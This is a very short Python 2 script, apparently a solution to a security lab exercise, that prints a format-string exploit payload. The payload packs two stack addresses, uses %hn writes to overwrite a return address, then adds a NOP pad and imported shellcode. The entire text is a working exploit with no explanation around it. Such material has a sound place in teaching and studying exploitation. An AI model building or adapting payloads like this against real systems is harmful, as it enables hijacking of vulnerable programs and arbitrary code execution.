from shellcode import shellcode
from struct import pack
print pack("<I", 0xbffe9ccc) + pack("<I", 0xbffe9cce) + "%38108x%04$hn%11034x%05$hn" + "\x90\x90" + shellcode
